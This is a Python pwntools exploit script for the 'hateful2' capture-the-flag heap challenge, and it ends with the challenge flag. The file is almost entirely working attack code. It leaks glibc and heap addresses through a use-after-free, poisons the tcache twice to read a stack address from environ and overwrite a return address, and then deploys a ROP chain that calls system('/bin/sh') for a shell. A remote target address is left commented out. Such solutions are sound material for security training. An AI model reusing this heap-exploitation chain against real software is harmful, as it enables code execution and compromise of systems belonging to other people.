from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./hateful2"
p = gdb.debug(['./ld-linux-x86-64.so.2', '--library-path', '.', CHALLENGE], '''
    file hateful2
    ni
    ni
    b *(main+197)
    b *(main+209)      
    b *(main+221)
    b *(main+233)                    
    continue
''')

# p = remote('52.59.124.14', 5022)

def add_message(index, size, text):
    print(p.recvuntil(b">> ").decode())
    p.send(b"1\n")
    print(p.recvuntil(b"Message Index: ").decode())
    p.send(str(index).encode() + b"\n")
    print(p.recvuntil(b"Message Size: ").decode())
    p.send(str(size).encode() + b"\n")
    print(p.recvuntil(b">> ").decode())
    p.send(text)
    print(p.recvuntil(b"Message Created!\n").decode())
    log.info(f"Adding message at index: {index} with size: {size} and text: {text}")

def edit_message(index, text):
    print(p.recvuntil(b">> ").decode())
    p.send(b"2\n")
    print(p.recvuntil(b"Message Index: ").decode())
    p.send(str(index).encode() + b"\n")
    print(p.recvuntil(b">> ").decode())
    p.send(text)
    print(p.recvuntil(b"Message Updated!\n").decode())
    log.info(f"Edting message at index: {index} with text: {text}")

def view_message(index):
    print(p.recvuntil(b">> ").decode())
    p.send(b"3\n")
    print(p.recvuntil(b"Message Index: ").decode())
    p.send(str(index).encode() + b"\n")
    print(p.recvuntil(b"Message: ").decode())
    log.info(f"Viewing message at index: {index}")
    return p.recvuntil(b"\n\n").strip()

def remove_message(index):
    print(p.recvuntil(b">> ").decode())
    p.send(b"4\n")
    print(p.recvuntil(b"Message Index: ").decode())
    p.send(str(index).encode() + b"\n")
    print(p.recvuntil(b"Message Deleted!\n").decode())
    log.info(f"Removing message at index: {index}")

# Stage 1: Leak glibc base address and calculate required glibc addresses
add_message(0, 0x410+1, b"A"*0x410)
add_message(1, 0x8+1, b"B"*0x8)
remove_message(0)
glibc_base_addr = (u64(view_message(0)[0:6].ljust(8, b"\x00")) & ~0xfff) - 0x1d2000
log.info(f"Leaking glibc base address: {hex(glibc_base_addr)}")
e = ELF("libc.so.6")
glibc_system_addr = glibc_base_addr + e.symbols.system
glibc_binsh_addr = glibc_base_addr + next(e.search(b"/bin/sh"))
glibc_environ_addr = glibc_base_addr + e.symbols.environ

# Stage 2: Leak heap base address
remove_message(1)
heap_base_addr = ((u64(view_message(1)[0:5].ljust(8, b"\x00")) << 12) ^ 0) & ~0xfff
log.info(f"Leaking heap base address: {hex(heap_base_addr)}")

# Stage 3: Prepare for the first tcache poisoning
add_message(2, 0x410+1, b"C"*0x410)
add_message(3, 0x8+1, b"D"*0x8)
add_message(4, 0x8+1, b"E"*0x8)
remove_message(3)
remove_message(4)

# Stage 4: Perform the first tcache poisoning to leak stack address in environ and calculate return address of create
edit_message(4, p64(((heap_base_addr + 0x6e0) >> 12) ^ (glibc_environ_addr - 0x10)))
add_message(5, 0x8+1, b"F"*0x8)
add_message(6, 0x10+1, b"G"*0x10)
stack_addr_in_environ = u64(view_message(6)[0x10:0x10+6].ljust(8, b"\x00"))
log.info(f"Leaking stack address in environ: {hex(stack_addr_in_environ)}")
add_message_return_addr = stack_addr_in_environ - 0x140

# Stage 5: Prepare for the second tcache poisoning
add_message(7, 0x28+1, b"H"*0x28)
add_message(8, 0x28+1, b"I"*0x28)
remove_message(7)
remove_message(8)

# Stage 6: Perform the second tcache poisoning
edit_message(8, p64(((heap_base_addr + 0x740) >> 12) ^ (add_message_return_addr - 0x8)))
add_message(9, 0x28+1, b"J"*0x28)

# Stage 7: Form and deploy ROP chain by calling create
r = ROP("libc.so.6")
chain = [
    r.rdi.address + glibc_base_addr,
    glibc_binsh_addr,
    r.ret.address + glibc_base_addr,
    glibc_system_addr
]
add_message(10, 0x28+1, b"K"*0x8 + b"".join([p64(addr) for addr in chain]))

p.interactive()

# ENO{W3_4R3_50RRY_4G41N_TH4T_TH3_M3554G3_W45_N0T_53NT_T0_TH3_R1GHT_3M41L}
